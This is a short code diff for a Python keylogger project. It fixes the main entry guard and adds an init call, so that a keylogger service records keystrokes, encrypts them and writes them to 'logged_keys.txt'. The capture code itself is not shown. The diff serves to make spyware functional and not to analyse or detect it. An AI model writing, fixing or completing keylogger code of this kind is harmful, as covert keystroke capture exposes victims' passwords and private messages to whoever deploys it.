@@ -4,9 +4,9 @@ from encryptor import Encryptor
 from keyloggerManager import KeyLoggerManager
 import time
 
-
-if __name__ == "_main_":
+if __name__ == "__main__":
     keylogger = KeyLoggerService()
+    keylogger.init()
     writer = FileWriter("logged_keys.txt")
     encryptor = Encryptor(42)
     manager = KeyLoggerManager(keylogger, writer, encryptor)
